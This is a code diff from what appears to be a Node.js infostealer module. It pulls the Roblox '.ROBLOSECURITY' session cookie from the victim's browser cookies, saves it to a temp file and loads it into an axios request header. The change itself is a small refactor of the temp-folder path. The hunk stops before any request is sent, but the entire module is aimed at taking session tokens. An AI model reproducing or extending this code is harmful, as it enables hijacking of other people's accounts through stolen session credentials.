@@ -1,21 +1,21 @@
 const { join } = require('path');
 const fs = require('fs');
-const { tempFolder } = require('../index');
 const { searchForFile } = require('../util/dir');
 const axios = require('axios');
 const { writeFileSync } = require('fs');
 const { getCookies } = require('../util/cookies');
+const { getTempFolder } = require('../util/init');
 
 module.exports = async () => {
   const cookies = await getCookies();
   const cookieValue = cookies.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
   if (!cookieValue) return;
   const { value: cookie, source } = cookieValue;
-  fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
+  fs.writeFileSync(join(getTempFolder(), 'Roblox Cookie.txt'), cookie);
 
-  const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
+  const file = await searchForFile(join(getTempFolder(), 'Roblox Cookie.txt'), 1000, 10);
   if (!file || file.trim() === '') return;
-  const jsonFile = join(tempFolder, 'Roblox.json');
+  const jsonFile = join(getTempFolder(), 'Roblox.json');
   const config = {
     headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') }
   };
